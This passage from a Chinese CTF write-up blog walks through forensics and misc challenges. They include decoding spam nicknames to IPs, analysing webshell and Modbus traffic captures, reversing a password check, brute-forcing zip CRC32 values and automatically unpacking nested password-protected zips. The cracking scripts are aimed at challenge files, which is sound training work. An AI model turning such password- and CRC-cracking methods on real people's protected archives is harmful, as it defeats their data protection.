class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">i, ip = 0, 0</span><br><span class="line">while ip &lt; 256 ** 4:</span><br><span class="line">    a, b, c, d = ip &gt;&gt; 24, (ip &gt;&gt; 16) &amp; 0xff, (ip &gt;&gt; 8) &amp; 0xff, ip &amp; 0xff</span><br><span class="line">    ip_str = &quot;%d.%d.%d.%d&quot; % (a, b, c, d)</span><br><span class="line">    f.write(f&quot;&#123;str(i).zfill(3)&#125; &#123;get(ip_str)&#125; &#123;ip_str&#125;\n&quot;)</span><br><span class="line">    i, ip = i + 1, ip + 103 * 513 * 313</span><br></pre></td></tr></table></figure><p>然后意识到这应该是最后一环了，只需要把这个周期的昵称部分整理出来就可以了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">D, exists = [], set(A + B + C)</span><br><span class="line">i, ip = 0, 0</span><br><span class="line">while ip &lt; 256 ** 4:</span><br><span class="line">    a, b, c, d = ip &gt;&gt; 24, (ip &gt;&gt; 16) &amp; 0xff, (ip &gt;&gt; 8) &amp; 0xff, ip &amp; 0xff</span><br><span class="line">    ip_str = &quot;%d.%d.%d.%d&quot; % (a, b, c, d)</span><br><span class="line">    nickname = get(ip_str)</span><br><span class="line">    parts = [nickname[j:j+3] for j in range(0, len(nickname), 3)]</span><br><span class="line">    D.extend([k for k in parts if k not in exists])</span><br><span class="line">    i, ip = i + 1, ip + 103 * 513 * 313</span><br><span class="line">print(D)</span><br><span class="line"></span><br><span class="line">D  =  [&#x27;Puc&#x27;, &#x27;Maz&#x27;, &#x27;Doh&#x27;, &#x27;Hun&#x27;, &#x27;Cud&#x27;, &#x27;Vit&#x27;, &#x27;Wer&#x27;, &#x27;Hag&#x27;, &#x27;Din&#x27;, &#x27;Feb&#x27;, &#x27;Gui&#x27;, &#x27;Rak&#x27;, &#x27;Vac&#x27;, &#x27;Kim&#x27;, &#x27;Pol&#x27;, &#x27;Som&#x27;, &#x27;Saa&#x27;, &#x27;Hac&#x27;, &#x27;Xie&#x27;, &#x27;Ses&#x27;, &#x27;Van&#x27;, &#x27;Nef&#x27;, &#x27;Mia&#x27;, &#x27;Tab&#x27;, &#x27;Pid&#x27;, &#x27;Ver&#x27;, &#x27;Cay&#x27;, &#x27;Jog&#x27;, &#x27;Jar&#x27;, &#x27;Lan&#x27;, &#x27;Hex&#x27;, &#x27;Soe&#x27;, &#x27;Lid&#x27;, &#x27;Fip&#x27;, &#x27;Wet&#x27;, &#x27;Ner&#x27;, &#x27;Dey&#x27;, &#x27;May&#x27;, &#x27;Dua&#x27;, &#x27;Dez&#x27;, &#x27;Gut&#x27;, &#x27;Sag&#x27;, &#x27;Kor&#x27;, &#x27;Yon&#x27;, &#x27;Haa&#x27;, &#x27;Par&#x27;, &#x27;Fat&#x27;, &#x27;Vel&#x27;, &#x27;Yum&#x27;, &#x27;Wac&#x27;, &#x27;Poe&#x27;, &#x27;Yes&#x27;, &#x27;Rex&#x27;, &#x27;Gop&#x27;, &#x27;Cit&#x27;, &#x27;Val&#x27;, &#x27;Xix&#x27;, &#x27;Bit&#x27;, &#x27;Mig&#x27;, &#x27;Mib&#x27;, &#x27;Gaa&#x27;, &#x27;Sat&#x27;, &#x27;Mex&#x27;, &#x27;Geo&#x27;, &#x27;Doi&#x27;, &#x27;Mou&#x27;, &#x27;Dol&#x27;, &#x27;Joy&#x27;, &#x27;Caa&#x27;, &#x27;Dix&#x27;, &#x27;Nat&#x27;, &#x27;Boj&#x27;, &#x27;Mad&#x27;, &#x27;Pew&#x27;, &#x27;Nev&#x27;, &#x27;Sas&#x27;, &#x27;Rin&#x27;, &#x27;Dal&#x27;, &#x27;Joo&#x27;, &#x27;Vii&#x27;, &#x27;Tid&#x27;, &#x27;Hap&#x27;, &#x27;Sea&#x27;, &#x27;Cae&#x27;, &#x27;Cab&#x27;, &#x27;Nea&#x27;, &#x27;Wan&#x27;, &#x27;Mem&#x27;, &#x27;Nam&#x27;, &#x27;Mao&#x27;, &#x27;Pov&#x27;, &#x27;Pio&#x27;, &#x27;Bey&#x27;, &#x27;Vas&#x27;, &#x27;Jee&#x27;, &#x27;Not&#x27;, &#x27;Lat&#x27;, &#x27;Sud&#x27;, &#x27;Bog&#x27;, &#x27;Hue&#x27;, &#x27;Rio&#x27;, &#x27;Got&#x27;, &#x27;Liu&#x27;, &#x27;Lax&#x27;, &#x27;Fec&#x27;, &#x27;Duc&#x27;, &#x27;Rec&#x27;, &#x27;Mas&#x27;, &#x27;Cig&#x27;, &#x27;Vox&#x27;, &#x27;Rov&#x27;, &#x27;Pow&#x27;, &#x27;Sil&#x27;, &#x27;Gac&#x27;, &#x27;Pet&#x27;, &#x27;Yay&#x27;, &#x27;Sad&#x27;, &#x27;Ram&#x27;, &#x27;Box&#x27;, &#x27;Wag&#x27;, &#x27;Nin&#x27;, &#x27;Lib&#x27;, &#x27;Tou&#x27;, &#x27;Dae&#x27;, &#x27;Tau&#x27;, &#x27;Teo&#x27;, &#x27;Sod&#x27;, &#x27;Hoy&#x27;, &#x27;Tip&#x27;, &#x27;Cer&#x27;, &#x27;Wee&#x27;, &#x27;Nov&#x27;, &#x27;Keg&#x27;, &#x27;Nit&#x27;, &#x27;Wok&#x27;, &#x27;Hin&#x27;, &#x27;Tue&#x27;, &#x27;Ron&#x27;, &#x27;Roi&#x27;, &#x27;Vos&#x27;, &#x27;Sao&#x27;, &#x27;Kia&#x27;, &#x27;Tix&#x27;, &#x27;Mip&#x27;, &#x27;Cub&#x27;, &#x27;Nah&#x27;, &#x27;Hot&#x27;, &#x27;Wic&#x27;, &#x27;Yar&#x27;, &#x27;Sic&#x27;, &#x27;Sar&#x27;, &#x27;Kok&#x27;, &#x27;Fee&#x27;, &#x27;Yuk&#x27;, &#x27;Hoo&#x27;, &#x27;Hei&#x27;, &#x27;Dap&#x27;, &#x27;Cen&#x27;, &#x27;Las&#x27;, &#x27;Guy&#x27;, &#x27;Jon&#x27;, &#x27;His&#x27;, &#x27;Moo&#x27;, &#x27;Roz&#x27;, &#x27;Fac&#x27;, &#x27;Fir&#x27;, &#x27;Ham&#x27;, &#x27;Rad&#x27;, &#x27;Foi&#x27;, &#x27;Sof&#x27;, &#x27;Poo&#x27;, &#x27;Toa&#x27;, &#x27;Kos&#x27;, &#x27;Sei&#x27;, &#x27;Dof&#x27;, &#x27;Get&#x27;, &#x27;Bap&#x27;, &#x27;Kes&#x27;, &#x27;Die&#x27;, &#x27;Dad&#x27;, &#x27;Pea&#x27;, &#x27;Nus&#x27;, &#x27;Tit&#x27;, &#x27;Ros&#x27;, &#x27;Nay&#x27;, &#x27;Moa&#x27;, &#x27;Zen&#x27;, &#x27;Mam&#x27;, &#x27;Heb&#x27;, &#x27;Fab&#x27;, &#x27;Rib&#x27;, &#x27;Cao&#x27;, &#x27;Hey&#x27;, &#x27;Wot&#x27;, &#x27;Soo&#x27;, &#x27;Kai&#x27;, &#x27;Cem&#x27;, &#x27;Rom&#x27;, &#x27;Uaw&#x27;, &#x27;Zed&#x27;, &#x27;Noi&#x27;, &#x27;Sab&#x27;, &#x27;Tes&#x27;, &#x27;Gob&#x27;, &#x27;Jax&#x27;, &#x27;Nob&#x27;, &#x27;Bao&#x27;, &#x27;Tos&#x27;, &#x27;Tor&#x27;, &#x27;Mep&#x27;, &#x27;Pan&#x27;, &#x27;Har&#x27;, &#x27;Guv&#x27;, &#x27;Foa&#x27;, &#x27;Nih&#x27;, &#x27;Cim&#x27;, &#x27;Pig&#x27;, &#x27;Jot&#x27;, &#x27;Sop&#x27;, &#x27;Duh&#x27;, &#x27;Jia&#x27;, &#x27;Nil&#x27;, &#x27;Fib&#x27;, &#x27;Kei&#x27;, &#x27;Gad&#x27;, &#x27;Toy&#x27;, &#x27;Pim&#x27;, &#x27;Gel&#x27;, &#x27;Cet&#x27;, &#x27;Hal&#x27;, &#x27;Wen&#x27;, &#x27;Yah&#x27;, &#x27;Nup&#x27;, &#x27;Jai&#x27;, &#x27;Paw&#x27;, &#x27;Pos&#x27;, &#x27;Qed&#x27;, &#x27;Tel&#x27;, &#x27;Gay&#x27;, &#x27;Liv&#x27;, &#x27;Bus&#x27;, &#x27;Fop&#x27;, &#x27;Pia&#x27;, &#x27;Miu&#x27;, &#x27;Ked&#x27;, &#x27;Fea&#x27;, &#x27;Fob&#x27;, &#x27;Sel&#x27;, &#x27;Miz&#x27;, &#x27;Lor&#x27;, &#x27;Tay&#x27;, &#x27;Pot&#x27;, &#x27;Tac&#x27;, &#x27;Wei&#x27;, &#x27;Mug&#x27;, &#x27;Dat&#x27;, &#x27;Wal&#x27;, &#x27;How&#x27;, &#x27;Yow&#x27;, &#x27;Pax&#x27;]</span><br></pre></td></tr></table></figure><p>那么就可以直接写解码将那些 Spam 留言者的昵称转换回 IP 地址，进一步解出 Flag 了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">targets = [&quot;VicCouNeaGas&quot;, &quot;DemHohBojWod&quot;, &quot;PowFitGuoRut&quot;, &quot;VetTasBesDae&quot;, &quot;FasLiuTasJoi&quot;, &quot;DevRecWoeDia&quot;, &quot;BogHubSorHad&quot;, &quot;BagLibYupSix&quot;, &quot;MowPetBecZan&quot;, &quot;LonRecRipLuk&quot;, &quot;KarYapTajGot&quot;, &quot;TiaLiuFayDic&quot;, &quot;VizDivCitBot&quot;, &quot;LeaLatReaSac&quot;, &quot;FasLiuVicToc&quot;, &quot;KunSadMerMun&quot;, &quot;LemLiuGuoReq&quot;]</span><br><span class="line"></span><br><span class="line">la, lb, lc, ld = len(A), len(B), len(C), len(D)</span><br><span class="line">for i in targets:</span><br><span class="line">    for j in [i[k:k+3] for k in range(0, len(i), 3)]:</span><br><span class="line">        if j in A: a = A.index(j)</span><br><span class="line">        elif j in B: b = B.index(j)</span><br><span class="line">        elif j in C: c = C.index(j)</span><br><span class="line">        elif j in D: d = D.index(j)</span><br><span class="line">        else: assert False</span><br><span class="line">    ip = d * (la*lb*lc) + c * (la*lb) + b * la + a</span><br><span class="line">    ip_part = [ip &gt;&gt; 24 &amp; 0xFF, ip &gt;&gt; 16 &amp; 0xFF, ip &gt;&gt; 8 &amp; 0xFF, ip &amp; 0xFF]</span><br><span class="line">    print(&#x27;&#x27;.join(map(chr, ip_part)), end=&#x27;&#x27;)</span><br><span class="line">print()</span><br></pre></td></tr></table></figure><h3 id="流量分析专题练习（NSSCTF）"><a href="#流量分析专题练习（NSSCTF）" class="headerlink" title="流量分析专题练习（NSSCTF）"></a>流量分析专题练习（NSSCTF）</h3><p><strong><em><del>（源自NSSCTF的流量分析题）</del></em></strong></p><h4 id="题目：-陇剑杯-2021-webshell（问2）"><a href="#题目：-陇剑杯-2021-webshell（问2）" class="headerlink" title="题目：[陇剑杯 2021]webshell（问2）"></a>题目：[陇剑杯 2021]webshell（问2）</h4><p>题目要求找到日志文件的绝对路径：</p><p>因为是日志文件，我们可以直接筛选.log文件：</p><p><img src="https://pic1.imgdb.cn/item/67d2634888c538a9b5bc61e6.png" alt=""></p><p>在后面的流量中找到了日志文件：</p><p><img src="https://pic1.imgdb.cn/item/67d2640088c538a9b5bc61ff.png" alt=""></p><p>但题目要求提交绝对路径，此时可通过已经查看分析的流量包中发现该网站系统为Linux系统，由此猜测默认目录为/var/www/html。也可以继续查看后续流量包，其中存在命令执行pwd，查看http流，可以准确的得到网站目录为/var/www/html</p><p><strong>/var/www/html/data/Runtime/Logs/Home/21_08_07.log</strong></p><h4 id="题目：-CISCN-2023-初赛-被加密的生产流量"><a href="#题目：-CISCN-2023-初赛-被加密的生产流量" class="headerlink" title="题目：[CISCN 2023 初赛]被加密的生产流量"></a>题目：[CISCN 2023 初赛]被加密的生产流量</h4><p>这是一道工业生产流量：（不禁想起了强网线下赛的流量分析题）</p><p>大部分是modbus和TCP流量包。</p><p>针对modbus协议分析，有以下脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import pyshark</span><br><span class="line">def get_code():</span><br><span class="line">     captures = pyshark.FileCapture(&quot;modbus.pcap&quot;)</span><br><span class="line">     func_codes = &#123;&#125;</span><br><span class="line">     for c in captures:</span><br><span class="line">         for pkt in c:</span><br><span class="line">             if pkt.layer_name == &quot;modbus&quot;:</span><br><span class="line">                 func_code = int(pkt.func_code)</span><br><span class="line">                 if func_code in func_codes:</span><br><span class="line">                     func_codes[func_code] += 1</span><br><span class="line">                 else:</span><br><span class="line">                     func_codes[func_code] = 1</span><br><span class="line">     print(func_codes)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line"> get_code()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行脚本，可以分析流量包中Modbus/TCP的协议功能码，功能码主要有以下几种：</p><p><img src="https://pic1.imgdb.cn/item/67d267af88c538a9b5bc62b5.png" alt=""></p><p>运行代码：</p><p><img src="https://pic1.imgdb.cn/item/67d27c5d88c538a9b5bc6d7f.png" alt=""></p><p>功能码为6（代表预置单个寄存器）的modbus协议数据包有16个，很可疑，于是我们使用wireshark过滤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">modbus.func_code == 6 &amp;&amp; modbus.request_frame</span><br></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/67d27cc188c538a9b5bc6dac.png" alt=""></p><p>追踪流，在TCP流中发现base32编码：</p><p><img src="https://pic1.imgdb.cn/item/67d27d1088c538a9b5bc6ddc.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MMYWMX3GNEYWOXZRGAYDA=</span><br></pre></td></tr></table></figure><p>解码得到flag：</p><p><img src="https://pic1.imgdb.cn/item/67d27d5588c538a9b5bc6dfd.png" alt=""></p><h4 id="题目：-LitCTF-2023-easy-shark"><a href="#题目：-LitCTF-2023-easy-shark" class="headerlink" title="题目：[LitCTF 2023]easy_shark"></a>题目：[LitCTF 2023]easy_shark</h4><ul><li>题目描述:卧底小帅在潜伏期间截获了一段非常可疑的流量，为了里面的内容不被泄露出去，小帅将flag进行了加密，你能成功发现犯罪团伙的秘密，并拯救小帅吗？flag格式：NSSCTF{flag_木马连接的key}</li><li>出题人：王八七七<br> flag以NSSCTF{}形式提交</li></ul><p>依旧是流量分析。</p><p>然而，刚下载的附件压缩包就被加密了，用010 Editor看看：</p><p>发现是伪加密，进行修复：</p><p><img src="https://pic1.imgdb.cn/item/67d281d888c538a9b5bc702a.png" alt=""></p><p>打开流量包，筛选http</p><p>可以发现第2个流中黑客上传了webshell</p><p><img src="https://pic1.imgdb.cn/item/67d2825f88c538a9b5bc7059.png" alt=""></p><p>同时，在最后一个流中，发现了一个一元二次方程和加密的flag：</p><p><img src="https://pic1.imgdb.cn/item/67d2831a88c538a9b5bc70dd.png" alt=""></p><p>方程的解为17和77，这应该是两个key，在常见的古典密码中，是仿射密码的可能性较大，我们使用随波逐流工具进行解密：</p><p><img src="https://pic1.imgdb.cn/item/67d2837f88c538a9b5bc711d.png" alt=""></p><h3 id="buuCTF-misc做题记录"><a href="#buuCTF-misc做题记录" class="headerlink" title="buuCTF misc做题记录"></a>buuCTF misc做题记录</h3><h4 id="题目：Mysterious"><a href="#题目：Mysterious" class="headerlink" title="题目：Mysterious"></a>题目：Mysterious</h4><p>一道逆向题（居然塞到misc里面）</p><p>题目是一个exe程序，打开提示输入密码：</p><p><img src="https://pic1.imgdb.cn/item/67cea953066befcec6e26b62.png" alt=""></p><p>程序放到exeinfo检查，发现为32位程序，无壳：</p><p><img src="https://pic1.imgdb.cn/item/67cea83b066befcec6e26b21.png" alt=""></p><p>我们通过IDA进行静态分析：</p><p>可以看到，非常明显的<code>WinMain</code>主函数（一般的win32程序就是WinMain作为主函数）</p><p><img src="https://pic1.imgdb.cn/item/67cea9a9066befcec6e26b75.png" alt=""></p><p>进入函数，对其反汇编</p><p><img src="https://pic1.imgdb.cn/item/67ceaa6b066befcec6e26bbb.png" alt=""></p><p>这里有一个<code>DialogBoxParamA</code>函数</p><p>详解：<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winuser/nf-winuser-dialogboxparama">https://learn.microsoft.com/zh-cn/windows/win32/api/winuser/nf-winuser-dialogboxparama</a></p><p>通过以上对<code>DialogBoxParamA</code>函数的描述，我们知道这是一个对话框函数，其中<code>DialogFunc</code>是指向对话框过程的指针，这个对话框过程便是一个回调函数，双击函数查看代码：</p><p><img src="https://pic1.imgdb.cn/item/67cead69066befcec6e26d02.png" alt=""></p><p>这里是一个间接调用。。</p><p><img src="https://pic1.imgdb.cn/item/67ceacc5066befcec6e26cb8.png" alt=""></p><p>接下来分析这个回调函数：</p><p>要满足if函数输出flag，</p><p><img src="https://pic1.imgdb.cn/item/67d2867b88c538a9b5bc71c2.png" alt=""></p><p>所以密码是122xyz，输入密码得到flag：</p><p><img src="https://pic1.imgdb.cn/item/67d286b788c538a9b5bc71cd.png" alt=""></p><h4 id="题目：zip"><a href="#题目：zip" class="headerlink" title="题目：zip"></a>题目：zip</h4><p>打开题目，一堆堆压缩包</p><p><img src="https://pic1.imgdb.cn/item/67d2a2f188c538a9b5bc7a3a.png" alt=""></p><p>每个压缩包里只有4bytes大小，于是可以想到是crc爆破：</p><p>有以下脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CrackCrc</span>(<span class="params">crc</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic: </span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> h <span class="keyword">in</span> dic:</span><br><span class="line">                    s = i + j + k + h</span><br><span class="line">                    <span class="keyword">if</span> crc == (binascii.crc32(s.encode())):</span><br><span class="line">                        f.write(s)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CrackZip</span>():</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">68</span>):</span><br><span class="line">            file = <span class="string">&#x27;out&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;.zip&#x27;</span></span><br><span class="line">            crc = zipfile.ZipFile(file,<span class="string">&#x27;r&#x27;</span>).getinfo(<span class="string">&#x27;data.txt&#x27;</span>).CRC</span><br><span class="line">            CrackCrc(crc)</span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters + string.digits + <span class="string">&#x27;+/=&#x27;</span></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">CrackZip()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;CRC32碰撞完成&quot;</span>)</span><br><span class="line">f.close</span><br></pre></td></tr></table></figure><p>运行后，得到的结果是一串base64:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z5BzAAANAAAAAAAAAKo+egCAIwBJAAAAVAAAAAKGNKv+a2MdSR0zAwABAAAAQ01UCRUUy91BT5UkSNPoj5hFEVFBRvefHSBCfG0ruGnKnygsMyj8SBaZHxsYHY84LEZ24cXtZ01y3k1K1YJ0vpK9HwqUzb6u9z8igEr3dCCQLQAdAAAAHQAAAAJi0efVT2MdSR0wCAAgAAAAZmxhZy50eHQAsDRpZmZpeCB0aGUgZmlsZSBhbmQgZ2V0IHRoZSBmbGFnxD17AEAHAA==</span><br></pre></td></tr></table></figure><p>进行解密：</p><p><img src="https://pic1.imgdb.cn/item/67d2a62b88c538a9b5bc7adb.png" alt=""></p><p>由于文件尾是3D 7B 00 40 07 00，所以这是rar文件</p><p>补全文件头：</p><p><img src="https://pic1.imgdb.cn/item/67d2a6f788c538a9b5bc7b31.png" alt=""></p><p>打开压缩包文件，得到flag</p><h4 id="题目：-WUSTCTF2020-girlfriend"><a href="#题目：-WUSTCTF2020-girlfriend" class="headerlink" title="题目：[WUSTCTF2020]girlfriend"></a>题目：[WUSTCTF2020]girlfriend</h4><p>题目是一个音频，显然是音频隐写。</p><p><img src="https://pic1.imgdb.cn/item/67d2a93f88c538a9b5bc7c1b.png" alt=""></p><p>频谱看上去不太像摩斯电码。</p><p>听出来这是手机键盘的拨号声，也就是DTMF拨号音识别</p><p>使用dtmf2num进行识别：</p><p><img src="https://pic1.imgdb.cn/item/67d2a91188c538a9b5bc7c13.png" alt=""></p><p>对应手机上九宫格输入，得到最后的字符串为<code>YOUAREMYGIRLFRIENDS</code></p><p>切换成小写，得到flag</p><h4 id="题目：-DDCTF2018-╯°□°）╯︵-┻━┻"><a href="#题目：-DDCTF2018-╯°□°）╯︵-┻━┻" class="headerlink" title="题目：[DDCTF2018](╯°□°）╯︵ ┻━┻"></a>题目：[DDCTF2018](╯°□°）╯︵ ┻━┻</h4><p>题目是一个txt文件</p><p><img src="C:\Users\31715\AppData\Roaming\Typora\typora-user-images\image-20250313174742569.png" alt="image-20250313174742569"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">string = <span class="string">&quot;d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd&quot;</span></span><br><span class="line">sliced_list = [string[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(string), <span class="number">2</span>)]</span><br><span class="line"><span class="built_in">print</span>(sliced_list)   <span class="comment">##每两位切片</span></span><br><span class="line"> </span><br><span class="line">decimal_list = [<span class="built_in">int</span>(hex_num, <span class="number">16</span>) <span class="keyword">for</span> hex_num <span class="keyword">in</span> sliced_list]</span><br><span class="line"><span class="built_in">print</span>(decimal_list)   <span class="comment">##将十六进制转换为十进制</span></span><br><span class="line"> </span><br><span class="line">result_list = [num - <span class="number">128</span> <span class="keyword">for</span> num <span class="keyword">in</span> decimal_list]</span><br><span class="line"><span class="built_in">print</span>(result_list)    <span class="comment">##转换后的十进制数都大于128，将列表内的每个数都减128</span></span><br><span class="line"> </span><br><span class="line">ascii_list = [<span class="built_in">chr</span>(decimal) <span class="keyword">for</span> decimal <span class="keyword">in</span> result_list]</span><br><span class="line"><span class="built_in">print</span>(ascii_list)     <span class="comment">##将十进制数转换为ASCII码</span></span><br><span class="line"> </span><br><span class="line">merged_string = <span class="string">&#x27;&#x27;</span>.join([elem <span class="keyword">for</span> sublist <span class="keyword">in</span> ascii_list <span class="keyword">for</span> elem <span class="keyword">in</span> sublist])</span><br><span class="line"><span class="built_in">print</span>(merged_string)    <span class="comment">##最终合并为一个字符串</span></span><br></pre></td></tr></table></figure><p>得到flag：</p><pre><code>flag&#123;922ab9974a47cd322cf43b50610faea5&#125;</code></pre><h4 id="题目：-MRCTF2020-千层套路"><a href="#题目：-MRCTF2020-千层套路" class="headerlink" title="题目：[MRCTF2020]千层套路"></a>题目：[MRCTF2020]千层套路</h4><p>打开是一个压缩包，显示被加密</p><p>直接爆破密码：</p><p><img src="https://pic1.imgdb.cn/item/67d2b99788c538a9b5bc8057.png" alt=""></p><p>打开后里面又是一个压缩包，继续爆破，此时我们发现，密码就是压缩包的文件名！</p><p>使用python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_and_store_final_file</span>(<span class="params">initial_zip_path, target_dir</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(target_dir):</span><br><span class="line">        os.makedirs(target_dir)</span><br><span class="line"> </span><br><span class="line">    current_zip_path = initial_zip_path</span><br><span class="line"> </span><br><span class="line">    password = os.path.basename(initial_zip_path)[:<span class="number">4</span>]</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">with</span> zipfile.ZipFile(current_zip_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_ref:</span><br><span class="line">            files = zip_ref.namelist()</span><br><span class="line">            file_name = files[<span class="number">0</span>]</span><br><span class="line">            next_zip_name = os.path.join(target_dir, file_name)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                zip_ref.extractall(target_dir, pwd=<span class="built_in">bytes</span>(password, <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Extracted <span class="subst">&#123;file_name&#125;</span> to <span class="subst">&#123;target_dir&#125;</span> using password <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> RuntimeError <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Error extracting <span class="subst">&#123;file_name&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> file_name.endswith(<span class="string">&#x27;.zip&#x27;</span>):</span><br><span class="line">                current_zip_path = next_zip_name</span><br><span class="line">                password = file_name[:<span class="number">4</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line"> </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;The final file is <span class="subst">&#123;file_name&#125;</span>, stored in <span class="subst">&#123;target_dir&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">initial_zip_path = <span class="string">&#x27;0573.zip&#x27;</span></span><br><span class="line">target_dir = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">extract_and_store_final_file(initial_zip_path, target_dir)</span><br></pre></td></tr></table></figure><p>脚本提取文件名的前四位作为密码，然后将解压后的文件都放进名为flag的文件夹中，直到解压出的文件后缀不是zip为止。</p><p>最终，发现qr.zip</p><p>解压：</p><p><img src="https://pic1.imgdb.cn/item/67d2baa188c538a9b5bc8080.png" alt=""></p><p>发现一串RGB数据，利用脚本还原图片：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 